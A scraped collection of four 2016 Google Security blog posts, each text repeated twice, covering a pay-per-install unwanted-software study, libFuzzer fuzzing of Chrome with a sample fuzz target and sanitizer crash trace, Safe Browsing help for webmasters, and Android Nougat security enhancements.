{"website": "Google-Security", "title": "\nNew research: Zeroing in on deceptive software installations\n", "author": ["Posted by Kurt Thomas, Research Scientist and Juan A. Elices Crespo, Software Engineer"], "link": "https://security.googleblog.com/2016/08/new-research-zeroing-in-on-deceptive.html", "abstract": "                             Posted by Kurt Thomas, Research Scientist and Juan A. Elices Crespo, Software Engineer     As part of Google&#8217;s ongoing effort to  protect users from unwanted software , we have been zeroing in on the deceptive installation tactics and actors that play a role in unwanted software delivery. This software includes  unwanted ad injectors  that insert unintended ads into webpages and  browser settings hijackers  that change search settings without user consent.    Every week, Google Safe Browsing generates over 60 million warnings to help users avoid installing unwanted software--that&#8217;s more than 3x the number of warnings we show for malware. Many of these warnings appear when users unwittingly download software bundles laden with several additional applications, a business model known as pay-per-install that earns up to $1.50 for each successful install. Recently, we finished the first in-depth investigation with  NYU Tandon School of Engineering  into multiple pay-per-install networks and the unwanted software families purchasing installs. The full report, which you can  read here , will be presented next week at the  USENIX Security Symposium .    Over a year-long period, we found four of the largest pay-per-install networks routinely distributed unwanted ad injectors, browser settings hijackers, and scareware flagged by over 30 anti-virus engines. These bundles were deceptively promoted through fake software updates, phony content lockers, and spoofed brands--techniques openly discussed on underground forums as ways to trick users into unintentionally downloading software and accepting the installation terms. While not all software bundles lead to unwanted software, critically, it takes only one deceptive party in a chain of web advertisements, pay-per-install networks, and application developers for abuse to manifest.   Behind the scenes of unwanted software distribution                 Software bundle installation dialogue.&nbsp;Accepting the express install option will cause eight other programs to be installed with no indication of each program&#8217;s functionality.        If you have ever encountered an installation dialog like the one above, then you are already familiar with the pay-per-install distribution model. Behind the scenes there are a few different players:      Advertisers : In pay-per-install lingo, advertisers are software developers, including unwanted software developers, paying for installs via bundling. In our example above, these advertisers include Plus-HD and Vuupc among others. The cost per install ranges anywhere from $0.10 in South America to $1.50 in the United States. Unwanted software developers will recoup this loss via ad injection, selling search traffic, or levying subscription fees. During our investigation, we identified 1,211 advertisers paying for installs.        Affiliate networks : Affiliate networks serve as middlemen between advertisers looking to buy installs and popular software packages willing to bundle additional applications in return for a fee. These affiliate networks provide the core technology for tracking successful installs and billing. Additionally, they provide tools that attempt to thwart Google Safe Browsing or anti-virus detection. We spotted at least 50 affiliate networks fueling this business.        Publishers : Finally, popular software applications re-package their binaries to include several advertiser offers. Publishers are then responsible for getting users to download and install their software through whatever means possible: download portals, organic page traffic, or often times deceptive ads. Our study uncovered 2,518 publishers distributing through 191,372 webpages.      This decentralized model encourages advertisers to focus solely on monetizing users upon installation and for publishers to maximize conversion, irrespective of the final user experience. It takes only one bad actor anywhere in the distribution chain for unwanted installs to manifest.                   What gets bundled?            We monitored the offers bundled by four of the largest pay-per-install affiliate networks on a daily basis for over a year. In total, we collected 446K offers related to 843 unique software packages. The most commonly bundled software included unwanted ad injectors, browser settings hijackers, and scareware purporting to fix urgent issues with a victim&#8217;s machine for $30-40. Here&#8217;s an example of an ad injector impersonating an anti-virus alert to scam users into fixing non-existent system issues:                          Deceptive practices          Taken as a whole, we found 59% of weekly offers bundled by pay-per-install affiliate networks were flagged by at least one anti-virus engine as potentially unwanted. In response, software bundles will first fingerprint a user&#8217;s machine prior to installation to detect the presence of &#8220;hostile&#8221; anti-virus engines. Furthermore, in response to protections provide by Google Safe Browsing, publishers have resorted to increasingly convoluted tactics to try and avoid detection, like the defunct technique shown below of password protecting compressed binaries:                     Paired with deceptive promotional tools like  fake video codecs, software updates, or misrepresented brands , there are a multitude of deceptive behaviors currently pervasive to software bundling.                   Cleaning up the ecosystem            We are  constantly improving Google Safe Browsing  defenses and the  Chrome Cleanup Tool  to protect users from unwanted software installs. When it comes to our  ads policy , we take quick action to block and remove advertisers who misrepresent downloads or distribute software that violates Google&#8217;s  unwanted software policy .         Additionally, Google is pushing for real change from businesses involved in the pay-per-install market to address the deceptive practices of some participants. As part of this, Google recently hosted a Clean Software Summit bringing together members of the anti-virus industry, bundling platforms, and the  Clean Software Alliance . Together, we laid the groundwork for an industry-wide initiative to provide users with clear choices when installing software and to block deceptive actors pushing unwanted installs. We continue to advocate on behalf of users to ensure they remain safe while downloading software online.                                     Posted by Kurt Thomas, Research Scientist and Juan A. Elices Crespo, Software Engineer  As part of Google’s ongoing effort to protect users from unwanted software, we have been zeroing in on the deceptive installation tactics and actors that play a role in unwanted software delivery. This software includes unwanted ad injectors that insert unintended ads into webpages and browser settings hijackers that change search settings without user consent.  Every week, Google Safe Browsing generates over 60 million warnings to help users avoid installing unwanted software--that’s more than 3x the number of warnings we show for malware. Many of these warnings appear when users unwittingly download software bundles laden with several additional applications, a business model known as pay-per-install that earns up to $1.50 for each successful install. Recently, we finished the first in-depth investigation with NYU Tandon School of Engineering into multiple pay-per-install networks and the unwanted software families purchasing installs. The full report, which you can read here, will be presented next week at the USENIX Security Symposium.  Over a year-long period, we found four of the largest pay-per-install networks routinely distributed unwanted ad injectors, browser settings hijackers, and scareware flagged by over 30 anti-virus engines. These bundles were deceptively promoted through fake software updates, phony content lockers, and spoofed brands--techniques openly discussed on underground forums as ways to trick users into unintentionally downloading software and accepting the installation terms. While not all software bundles lead to unwanted software, critically, it takes only one deceptive party in a chain of web advertisements, pay-per-install networks, and application developers for abuse to manifest. Behind the scenes of unwanted software distribution      Software bundle installation dialogue. Accepting the express install option will cause eight other programs to be installed with no indication of each program’s functionality.   If you have ever encountered an installation dialog like the one above, then you are already familiar with the pay-per-install distribution model. Behind the scenes there are a few different players:  Advertisers: In pay-per-install lingo, advertisers are software developers, including unwanted software developers, paying for installs via bundling. In our example above, these advertisers include Plus-HD and Vuupc among others. The cost per install ranges anywhere from $0.10 in South America to $1.50 in the United States. Unwanted software developers will recoup this loss via ad injection, selling search traffic, or levying subscription fees. During our investigation, we identified 1,211 advertisers paying for installs.   Affiliate networks: Affiliate networks serve as middlemen between advertisers looking to buy installs and popular software packages willing to bundle additional applications in return for a fee. These affiliate networks provide the core technology for tracking successful installs and billing. Additionally, they provide tools that attempt to thwart Google Safe Browsing or anti-virus detection. We spotted at least 50 affiliate networks fueling this business.   Publishers: Finally, popular software applications re-package their binaries to include several advertiser offers. Publishers are then responsible for getting users to download and install their software through whatever means possible: download portals, organic page traffic, or often times deceptive ads. Our study uncovered 2,518 publishers distributing through 191,372 webpages.   This decentralized model encourages advertisers to focus solely on monetizing users upon installation and for publishers to maximize conversion, irrespective of the final user experience. It takes only one bad actor anywhere in the distribution chain for unwanted installs to manifest.      What gets bundled?    We monitored the offers bundled by four of the largest pay-per-install affiliate networks on a daily basis for over a year. In total, we collected 446K offers related to 843 unique software packages. The most commonly bundled software included unwanted ad injectors, browser settings hijackers, and scareware purporting to fix urgent issues with a victim’s machine for $30-40. Here’s an example of an ad injector impersonating an anti-virus alert to scam users into fixing non-existent system issues:          Deceptive practices    Taken as a whole, we found 59% of weekly offers bundled by pay-per-install affiliate networks were flagged by at least one anti-virus engine as potentially unwanted. In response, software bundles will first fingerprint a user’s machine prior to installation to detect the presence of “hostile” anti-virus engines. Furthermore, in response to protections provide by Google Safe Browsing, publishers have resorted to increasingly convoluted tactics to try and avoid detection, like the defunct technique shown below of password protecting compressed binaries:        Paired with deceptive promotional tools like fake video codecs, software updates, or misrepresented brands, there are a multitude of deceptive behaviors currently pervasive to software bundling.      Cleaning up the ecosystem    We are constantly improving Google Safe Browsing defenses and the Chrome Cleanup Tool to protect users from unwanted software installs. When it comes to our ads policy, we take quick action to block and remove advertisers who misrepresent downloads or distribute software that violates Google’s unwanted software policy.    Additionally, Google is pushing for real change from businesses involved in the pay-per-install market to address the deceptive practices of some participants. As part of this, Google recently hosted a Clean Software Summit bringing together members of the anti-virus industry, bundling platforms, and the Clean Software Alliance. Together, we laid the groundwork for an industry-wide initiative to provide users with clear choices when installing software and to block deceptive actors pushing unwanted installs. We continue to advocate on behalf of users to ensure they remain safe while downloading software online.     ", "date": "August 4, 2016"},
{"website": "Google-Security", "title": "\nGuided in-process fuzzing of Chrome components\n", "author": ["Posted by Max Moroz, ", " and Kostya Serebryany, "], "link": "https://security.googleblog.com/2016/08/guided-in-process-fuzzing-of-chrome.html", "abstract": "                             Posted by Max Moroz,  Chrome Security Engineer  and Kostya Serebryany,  Sanitizer Tsar      In the past, we&#8217;ve posted about innovations in fuzzing, a software testing technique used to discover coding errors and security vulnerabilities. The topics have included  AddressSanitizer ,  ClusterFuzz ,  SyzyASAN ,  ThreadSanitizer  and  others .    Today we'd like to talk about  libFuzzer  (part of the  LLVM  project), an engine for  in-process, coverage-guided, white-box fuzzing :       By  in-process , we mean that we don&#8217;t launch a new process for every test case, and that we mutate inputs directly in memory.   By  coverage-guided , we mean that we measure code coverage for every input, and accumulate test cases that increase overall coverage.   By  white-box , we mean that we use compile-time instrumentation of the source code.        LibFuzzer makes it possible to fuzz individual components of Chrome. This means you don&#8217;t need to generate an HTML page or network payload and launch the whole browser, which adds overhead and flakiness to testing. Instead, you can fuzz any function or internal API directly. Based on our experience, libFuzzer-based fuzzing is extremely efficient, more reliable, and usually thousands of times faster than traditional out-of-process fuzzing.         Our goal is to have fuzz testing for every component of Chrome where fuzzing is applicable, and we hope all Chromium developers and external security researchers will contribute to this effort.          How to write a fuzz target          With libFuzzer, you need to write only one function, which we call a target function or a fuzz target. It accepts a data buffer and length as input and then feeds it into the code we want to test. And... that&#8217;s it!         The fuzz targets are not specific to libFuzzer. Currently, we also run them with  AFL , and we expect to use other fuzzing engines in the future.    Sample Fuzzer             extern     \"  C  \"     int     LLVMFuzzerTestOneInput  (  const   uint8_t  *     data  ,     size_t     size  )     {      &nbsp;std  ::  string buf  ;      &nbsp;woff2  ::  WOFF2StringOut out  (&amp;  buf  )  ;      &nbsp;out  .  SetMaxSize  (  30     *     1024     *     1024  )  ;      &nbsp;woff2  ::  ConvertWOFF2ToTTF  (  data  ,     size  ,     &amp;  out  )  ;      &nbsp;  return     0  ;     }     See also the  build rule .    Sample Bug              ==9896==ERROR: AddressSanitizer:   heap-buffer-overflow   on address 0x62e000022836 at pc 0x000000499c51 bp 0x7fffa0dc1450 sp 0x7fffa0dc0c00        WRITE of size 41994 at 0x62e000022836 thread T0        SCARINESS: 45 (multi-byte-write-heap-buffer-overflow)         &nbsp;&nbsp;&nbsp;#0 0x499c50 in __asan_memcpy         &nbsp;&nbsp;&nbsp;#1 0x4e6b50 in Read third_party/woff2/src/buffer.h:86:7         &nbsp;&nbsp;&nbsp;#2 0x4e6b50 in ReconstructGlyf third_party/woff2/src/woff2_dec.cc:500         &nbsp;&nbsp;&nbsp;#3 0x4e6b50 in ReconstructFont third_party/woff2/src/woff2_dec.cc:917         &nbsp;&nbsp;&nbsp;#4 0x4e6b50 in woff2::ConvertWOFF2ToTTF(unsigned char const*, unsigned long, woff2::WOFF2Out*) third_party/woff2/src/woff2_dec.cc:1282        &nbsp;&nbsp;&nbsp;#5 0x4dbfd6 in LLVMFuzzerTestOneInput testing/libfuzzer/fuzzers/convert_woff2ttf_fuzzer.cc:15:3       Check out  our documentation  for additional information.      Integrating LibFuzzer with ClusterFuzz      ClusterFuzz  is Chromium&#8217;s infrastructure for large scale fuzzing. It automates crash detection, report deduplication, test minimization, and other tasks. Once you commit a fuzz target into the Chromium codebase ( examples ), ClusterFuzz will automatically pick it up and fuzz it with libFuzzer and AFL.&nbsp;     ClusterFuzz supports most of the libFuzzer features like dictionaries, seed corpus and custom options for different fuzzers. Check out our  Efficient Fuzzer Guide  to learn how to use them.     Besides the initial seed corpus, we store, minimize, and synchronize the corpora for every fuzzer and across all bots. This allows us to continuously increase code coverage over time and find interesting bugs along the way.    ClusterFuzz uses the following memory debugging tools with libFuzzer-based fuzzers:      AddressSanitizer (ASan):  500 GCE VMs    MemorySanitizer (MSan):  100 GCE VMs    UndefinedBehaviorSanitizer (UBSan):  100 GCE VMs           Sample Fuzzer Statistics         It&#8217;s important to track and analyze performance of fuzzers. So, we have this dashboard to track fuzzer statistics, that is accessible to all chromium developers:                   Overall statistics for the last 30 days:       120 &nbsp;fuzzers    112  bugs filed   Aaaaaand&#8230;.  14,366,371,459,772 unique test inputs!            Analysis of the bugs found so far                   Looking at the  324  bugs found so far, we can say that ASan and MSan have been very effective memory tools for finding security vulnerabilities. They give us comparable numbers of crashes, though ASan crashes usually are more severe than MSan ones. LSan (part of ASan) and UBSan have a great impact for Stability - another one of our  4 core principles .                 Extending Chrome&#8217;s Vulnerability Reward Program          Under Chrome's Trusted Researcher Program, we invite submission of fuzzers. We run them for you on ClusterFuzz and automatically nominate bugs they find for reward payments.         Today we're pleased to announce that the invite-only Trusted Researcher Program is being replaced with the Chrome Fuzzer Program which encourages fuzzer submissions from all, and also covers libFuzzer-based fuzzers! Full guidelines are listed on  Chrome&#8217;s Vulnerability Reward Program page .                                       Posted by Max Moroz, Chrome Security Engineer and Kostya Serebryany, Sanitizer Tsar  In the past, we’ve posted about innovations in fuzzing, a software testing technique used to discover coding errors and security vulnerabilities. The topics have included AddressSanitizer, ClusterFuzz, SyzyASAN, ThreadSanitizer and others.  Today we'd like to talk about libFuzzer (part of the LLVM project), an engine for in-process, coverage-guided, white-box fuzzing:   By in-process, we mean that we don’t launch a new process for every test case, and that we mutate inputs directly in memory. By coverage-guided, we mean that we measure code coverage for every input, and accumulate test cases that increase overall coverage. By white-box, we mean that we use compile-time instrumentation of the source code.    LibFuzzer makes it possible to fuzz individual components of Chrome. This means you don’t need to generate an HTML page or network payload and launch the whole browser, which adds overhead and flakiness to testing. Instead, you can fuzz any function or internal API directly. Based on our experience, libFuzzer-based fuzzing is extremely efficient, more reliable, and usually thousands of times faster than traditional out-of-process fuzzing.    Our goal is to have fuzz testing for every component of Chrome where fuzzing is applicable, and we hope all Chromium developers and external security researchers will contribute to this effort.    How to write a fuzz target    With libFuzzer, you need to write only one function, which we call a target function or a fuzz target. It accepts a data buffer and length as input and then feeds it into the code we want to test. And... that’s it!    The fuzz targets are not specific to libFuzzer. Currently, we also run them with AFL, and we expect to use other fuzzing engines in the future. Sample Fuzzer    extern \"C\" int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) {  std::string buf;  woff2::WOFF2StringOut out(&buf);  out.SetMaxSize(30 * 1024 * 1024);  woff2::ConvertWOFF2ToTTF(data, size, &out);  return 0;} See also the build rule. Sample Bug     ==9896==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x62e000022836 at pc 0x000000499c51 bp 0x7fffa0dc1450 sp 0x7fffa0dc0c00  WRITE of size 41994 at 0x62e000022836 thread T0  SCARINESS: 45 (multi-byte-write-heap-buffer-overflow)      #0 0x499c50 in __asan_memcpy      #1 0x4e6b50 in Read third_party/woff2/src/buffer.h:86:7      #2 0x4e6b50 in ReconstructGlyf third_party/woff2/src/woff2_dec.cc:500      #3 0x4e6b50 in ReconstructFont third_party/woff2/src/woff2_dec.cc:917      #4 0x4e6b50 in woff2::ConvertWOFF2ToTTF(unsigned char const*, unsigned long, woff2::WOFF2Out*) third_party/woff2/src/woff2_dec.cc:1282     #5 0x4dbfd6 in LLVMFuzzerTestOneInput testing/libfuzzer/fuzzers/convert_woff2ttf_fuzzer.cc:15:3  Check out our documentation for additional information.  Integrating LibFuzzer with ClusterFuzz  ClusterFuzz is Chromium’s infrastructure for large scale fuzzing. It automates crash detection, report deduplication, test minimization, and other tasks. Once you commit a fuzz target into the Chromium codebase (examples), ClusterFuzz will automatically pick it up and fuzz it with libFuzzer and AFL.    ClusterFuzz supports most of the libFuzzer features like dictionaries, seed corpus and custom options for different fuzzers. Check out our Efficient Fuzzer Guide to learn how to use them.   Besides the initial seed corpus, we store, minimize, and synchronize the corpora for every fuzzer and across all bots. This allows us to continuously increase code coverage over time and find interesting bugs along the way.  ClusterFuzz uses the following memory debugging tools with libFuzzer-based fuzzers:  AddressSanitizer (ASan): 500 GCE VMs MemorySanitizer (MSan): 100 GCE VMs UndefinedBehaviorSanitizer (UBSan): 100 GCE VMs    Sample Fuzzer Statistics    It’s important to track and analyze performance of fuzzers. So, we have this dashboard to track fuzzer statistics, that is accessible to all chromium developers:       Overall statistics for the last 30 days:  120 fuzzers 112 bugs filed Aaaaaand…. 14,366,371,459,772 unique test inputs!    Analysis of the bugs found so far      Looking at the 324 bugs found so far, we can say that ASan and MSan have been very effective memory tools for finding security vulnerabilities. They give us comparable numbers of crashes, though ASan crashes usually are more severe than MSan ones. LSan (part of ASan) and UBSan have a great impact for Stability - another one of our 4 core principles.      Extending Chrome’s Vulnerability Reward Program    Under Chrome's Trusted Researcher Program, we invite submission of fuzzers. We run them for you on ClusterFuzz and automatically nominate bugs they find for reward payments.    Today we're pleased to announce that the invite-only Trusted Researcher Program is being replaced with the Chrome Fuzzer Program which encourages fuzzer submissions from all, and also covers libFuzzer-based fuzzers! Full guidelines are listed on Chrome’s Vulnerability Reward Program page.      ", "date": "August 5, 2016"},
{"website": "Google-Security", "title": "\nMore Safe Browsing Help for Webmasters\n", "author": ["Posted by Kelly Hope Harrington, Safe Browsing Team"], "link": "https://security.googleblog.com/2016/09/more-safe-browsing-help-for-webmasters.html", "abstract": "                             Posted by Kelly Hope Harrington, Safe Browsing Team   For more than  nine years , Safe Browsing has helped webmasters via Search Console with information about how to fix security issues with their sites. This includes relevant Help Center articles, example URLs to assist in diagnosing the presence of harmful content, and a process for webmasters to request reviews of their site after security issues are addressed. Over time, Safe Browsing has expanded its protection to cover additional threats to user safety such as  Deceptive Sites  and  Unwanted Software .    To help webmasters be even more successful in resolving issues, we&#8217;re happy to announce that we&#8217;ve updated the information available in Search Console in the Security Issues report.                The updated information provides more specific explanations of six different security issues detected by Safe Browsing, including  malware ,  deceptive pages ,  harmful downloads , and  uncommon downloads . These explanations give webmasters more context and detail about what Safe Browsing found. We also offer tailored recommendations for each type of issue, including sample URLs that webmasters can check to identify the source of the issue, as well as specific remediation actions webmasters can take to resolve the issue.    We on the Safe Browsing team definitely recommend  registering  your site in Search Console even if it is not currently experiencing a security issue. We send notifications through Search Console so webmasters can address any issues that appear  as quickly as possible .    Our goal is to help webmasters provide a safe and secure browsing experience for their users. We welcome any questions or feedback about the new features on the  Google Webmaster Help Forum , where  Top Contributors  and Google employees are available to help.    For more information about Safe Browsing&#8217;s ongoing work to shine light on the state of web security and encourage safer web security practices, check out our summary of trends and findings on the  Safe Browsing Transparency Report . If you&#8217;re interested in the tools Google provides for webmasters and developers dealing with hacked sites, this  video  provides a great overview.                                   Posted by Kelly Hope Harrington, Safe Browsing Team For more than nine years, Safe Browsing has helped webmasters via Search Console with information about how to fix security issues with their sites. This includes relevant Help Center articles, example URLs to assist in diagnosing the presence of harmful content, and a process for webmasters to request reviews of their site after security issues are addressed. Over time, Safe Browsing has expanded its protection to cover additional threats to user safety such as Deceptive Sites and Unwanted Software.  To help webmasters be even more successful in resolving issues, we’re happy to announce that we’ve updated the information available in Search Console in the Security Issues report.      The updated information provides more specific explanations of six different security issues detected by Safe Browsing, including malware, deceptive pages, harmful downloads, and uncommon downloads. These explanations give webmasters more context and detail about what Safe Browsing found. We also offer tailored recommendations for each type of issue, including sample URLs that webmasters can check to identify the source of the issue, as well as specific remediation actions webmasters can take to resolve the issue.  We on the Safe Browsing team definitely recommend registering your site in Search Console even if it is not currently experiencing a security issue. We send notifications through Search Console so webmasters can address any issues that appear as quickly as possible.  Our goal is to help webmasters provide a safe and secure browsing experience for their users. We welcome any questions or feedback about the new features on the Google Webmaster Help Forum, where Top Contributors and Google employees are available to help.  For more information about Safe Browsing’s ongoing work to shine light on the state of web security and encourage safer web security practices, check out our summary of trends and findings on the Safe Browsing Transparency Report. If you’re interested in the tools Google provides for webmasters and developers dealing with hacked sites, this video provides a great overview.     ", "date": "September 6, 2016"},
{"website": "Google-Security", "title": "\nKeeping Android safe: Security enhancements in Nougat\n", "author": ["Posted by Xiaowen Xin, Android Security Team"], "link": "https://security.googleblog.com/2016/09/keeping-android-safe-security.html", "abstract": "                             Posted by Xiaowen Xin, Android Security Team    [Cross-posted from the  Android Developers Blog ]     Over the course of the summer, we previewed a variety of security enhancements in Android 7.0 Nougat: an increased focus on security with our  vulnerability rewards program , a new  Direct Boot mode , re-architected mediaserver and  hardened media stack , apps that are protected from  accidental regressions to cleartext traffic , an update to the way Android handles  trusted certificate authorities , strict enforcement of  verified boot  with error correction, and  updates to the Linux kernel to reduce the attack surface and increase memory protection . Phew!    Now that Nougat has begun to roll out, we wanted to recap these updates in a single overview and highlight a few new improvements.   Direct Boot and encryption       In previous versions of Android, users with encrypted devices would have to enter their PIN/pattern/password by default during the boot process to decrypt their storage area and finish booting. With Android 7.0 Nougat, we&#8217;ve updated the underlying encryption scheme and streamlined the boot process to speed up rebooting your phone. Now your phone&#8217;s main features, like the phone app and your alarm clock, are ready right away before you even type your PIN, so people can call you and your alarm clock can wake you up. We call this feature  Direct Boot .    Under the hood, file-based encryption enables this improved user experience. With this new encryption scheme, the system storage area, as well as each user profile storage area, are all encrypted separately. Unlike with full-disk encryption, where all data was encrypted as a single unit, per-profile-based encryption enables the system to reboot normally into a functional state using just device keys. Essential apps can opt-in to run in a limited state after reboot, and when you enter your lock screen credential, these apps then get access your user data to provide full functionality.    File-based encryption better isolates and protects individual users and profiles on a device by encrypting data at a finer granularity. Each profile is encrypted using a unique key that can only be unlocked by your PIN or password, so that your data can only be decrypted by you.             Encryption support is getting stronger across the Android ecosystem as well. Starting with Marshmallow, all capable devices were required to support encryption. Many devices, like Nexus 5X and 6P also use unique keys that are accessible only with trusted hardware, such as the ARM TrustZone. Now with 7.0 Nougat, all new capable Android devices must also have this kind of hardware support for key storage and provide brute force protection while verifying your lock screen credential before these keys can be used. This way, all of your data can only be decrypted on that exact device and only by you.                 The media stack and platform hardening            In Android Nougat, we&#8217;ve both hardened and  re-architected  mediaserver, one of the main system services that processes untrusted input. First, by incorporating integer overflow sanitization, part of Clang&#8217;s  UndefinedBehaviorSanitizer , we prevent an entire class of vulnerabilities, which comprise the majority of reported libstagefright bugs. As soon as an integer overflow is detected, we shut down the process so an attack is stopped. Second, we&#8217;ve modularized the media stack to put different components into individual sandboxes and tightened the privileges of each sandbox to have the minimum privileges required to perform its job. With this containment technique, a compromise in many parts of the stack grants the attacker access to significantly fewer permissions and significantly reduced exposed kernel attack surface.         In addition to hardening the mediaserver, we&#8217;ve added a large list of protections for the platform, including:         Verified Boot: Verified Boot is now strictly enforced to prevent compromised devices from booting; it supports  error correction  to improve reliability against non-malicious data corruption.   SELinux: Updated SELinux configuration and increased Seccomp coverage further locks down the application sandbox and reduces attack surface. Library load order randomization and improved ASLR: Increased randomness makes some code-reuse attacks less reliable.    Kernel hardening : Added additional memory protection for newer kernels by  marking portions of kernel memory as read-only ,  restricting kernel access to userspace addresses , and further reducing the existing attack surface.    APK signature scheme v2 : Introduced a whole-file signature scheme that improves  verification speed  and strengthens integrity guarantees.       App security improvements            Android Nougat is the safest and easiest version of Android for application developers to use.       Apps that want to share data with other apps now must explicitly opt-in by offering their files through a  Content Provider , like  FileProvider . The application private directory (usually /data/data/) is now set to Linux permission 0700 for apps targeting API Level 24+.   To make it easier for apps to control access to their secure network traffic, user-installed certificate authorities and those installed through Device Admin APIs are  no longer trusted by default  for apps targeting API Level 24+. Additionally, all new Android devices must ship with the  same trusted CA store .   With  Network Security Config , developers can more easily configure network security policy through a declarative configuration file. This includes blocking cleartext traffic, configuring the set of trusted CAs and certificates, and setting up a separate debug configuration.      We&#8217;ve also continued to refine app permissions and capabilities to protect you from potentially harmful apps.         To improve device privacy, we have further restricted and removed access to persistent device identifiers such as MAC addresses.   User interface overlays can no longer be displayed on top of permissions dialogs. This &#8220;clickjacking&#8221; technique was used by some apps to attempt to gain permissions improperly.   We&#8217;ve reduced the power of device admin applications so they can no longer change your lockscreen if you have a lockscreen set, and device admin will no longer be notified of impending disable via  onDisableRequested() . These were tactics used by some ransomware to gain control of a device.       System Updates            Lastly, we've made significant enhancements to the OTA update system to keep your device up-to-date much more easily with the latest system software and security patches. We've made the install time for OTAs faster, and the OTA size smaller for security updates. You no longer have to wait for the optimizing apps step, which was one of the slowest parts of the update process, because the new JIT compiler has been  optimized  to make installs and updates lightning fast.         The update experience is even faster for new Android devices running Nougat with updated firmware. Like they do with Chromebooks, updates are applied in the background while the device continues to run normally. These updates are applied to a different system partition, and when you reboot, it will seamlessly switch to that new partition running the new system software version.         We&#8217;re constantly working to improve Android security and Android Nougat brings significant security improvements across all fronts. As always, we appreciate feedback on our work and welcome suggestions for how we can improve Android. Contact us at  security@android.com .                                        Posted by Xiaowen Xin, Android Security Team [Cross-posted from the Android Developers Blog]  Over the course of the summer, we previewed a variety of security enhancements in Android 7.0 Nougat: an increased focus on security with our vulnerability rewards program, a new Direct Boot mode, re-architected mediaserver and hardened media stack, apps that are protected from accidental regressions to cleartext traffic, an update to the way Android handles trusted certificate authorities, strict enforcement of verified boot with error correction, and updates to the Linux kernel to reduce the attack surface and increase memory protection. Phew!  Now that Nougat has begun to roll out, we wanted to recap these updates in a single overview and highlight a few new improvements. Direct Boot and encryption  In previous versions of Android, users with encrypted devices would have to enter their PIN/pattern/password by default during the boot process to decrypt their storage area and finish booting. With Android 7.0 Nougat, we’ve updated the underlying encryption scheme and streamlined the boot process to speed up rebooting your phone. Now your phone’s main features, like the phone app and your alarm clock, are ready right away before you even type your PIN, so people can call you and your alarm clock can wake you up. We call this feature Direct Boot.  Under the hood, file-based encryption enables this improved user experience. With this new encryption scheme, the system storage area, as well as each user profile storage area, are all encrypted separately. Unlike with full-disk encryption, where all data was encrypted as a single unit, per-profile-based encryption enables the system to reboot normally into a functional state using just device keys. Essential apps can opt-in to run in a limited state after reboot, and when you enter your lock screen credential, these apps then get access your user data to provide full functionality.  File-based encryption better isolates and protects individual users and profiles on a device by encrypting data at a finer granularity. Each profile is encrypted using a unique key that can only be unlocked by your PIN or password, so that your data can only be decrypted by you.     Encryption support is getting stronger across the Android ecosystem as well. Starting with Marshmallow, all capable devices were required to support encryption. Many devices, like Nexus 5X and 6P also use unique keys that are accessible only with trusted hardware, such as the ARM TrustZone. Now with 7.0 Nougat, all new capable Android devices must also have this kind of hardware support for key storage and provide brute force protection while verifying your lock screen credential before these keys can be used. This way, all of your data can only be decrypted on that exact device and only by you.      The media stack and platform hardening    In Android Nougat, we’ve both hardened and re-architected mediaserver, one of the main system services that processes untrusted input. First, by incorporating integer overflow sanitization, part of Clang’s UndefinedBehaviorSanitizer, we prevent an entire class of vulnerabilities, which comprise the majority of reported libstagefright bugs. As soon as an integer overflow is detected, we shut down the process so an attack is stopped. Second, we’ve modularized the media stack to put different components into individual sandboxes and tightened the privileges of each sandbox to have the minimum privileges required to perform its job. With this containment technique, a compromise in many parts of the stack grants the attacker access to significantly fewer permissions and significantly reduced exposed kernel attack surface.    In addition to hardening the mediaserver, we’ve added a large list of protections for the platform, including:    Verified Boot: Verified Boot is now strictly enforced to prevent compromised devices from booting; it supports error correction to improve reliability against non-malicious data corruption. SELinux: Updated SELinux configuration and increased Seccomp coverage further locks down the application sandbox and reduces attack surface. Library load order randomization and improved ASLR: Increased randomness makes some code-reuse attacks less reliable. Kernel hardening: Added additional memory protection for newer kernels by marking portions of kernel memory as read-only, restricting kernel access to userspace addresses, and further reducing the existing attack surface. APK signature scheme v2: Introduced a whole-file signature scheme that improves verification speed and strengthens integrity guarantees.   App security improvements    Android Nougat is the safest and easiest version of Android for application developers to use.   Apps that want to share data with other apps now must explicitly opt-in by offering their files through a Content Provider, like FileProvider. The application private directory (usually /data/data/) is now set to Linux permission 0700 for apps targeting API Level 24+. To make it easier for apps to control access to their secure network traffic, user-installed certificate authorities and those installed through Device Admin APIs are no longer trusted by default for apps targeting API Level 24+. Additionally, all new Android devices must ship with the same trusted CA store. With Network Security Config, developers can more easily configure network security policy through a declarative configuration file. This includes blocking cleartext traffic, configuring the set of trusted CAs and certificates, and setting up a separate debug configuration.   We’ve also continued to refine app permissions and capabilities to protect you from potentially harmful apps.    To improve device privacy, we have further restricted and removed access to persistent device identifiers such as MAC addresses. User interface overlays can no longer be displayed on top of permissions dialogs. This “clickjacking” technique was used by some apps to attempt to gain permissions improperly. We’ve reduced the power of device admin applications so they can no longer change your lockscreen if you have a lockscreen set, and device admin will no longer be notified of impending disable via onDisableRequested(). These were tactics used by some ransomware to gain control of a device.   System Updates     Lastly, we've made significant enhancements to the OTA update system to keep your device up-to-date much more easily with the latest system software and security patches. We've made the install time for OTAs faster, and the OTA size smaller for security updates. You no longer have to wait for the optimizing apps step, which was one of the slowest parts of the update process, because the new JIT compiler has been optimized to make installs and updates lightning fast.    The update experience is even faster for new Android devices running Nougat with updated firmware. Like they do with Chromebooks, updates are applied in the background while the device continues to run normally. These updates are applied to a different system partition, and when you reboot, it will seamlessly switch to that new partition running the new system software version.    We’re constantly working to improve Android security and Android Nougat brings significant security improvements across all fronts. As always, we appreciate feedback on our work and welcome suggestions for how we can improve Android. Contact us at security@android.com.       ", "date": "September 6, 2016"},
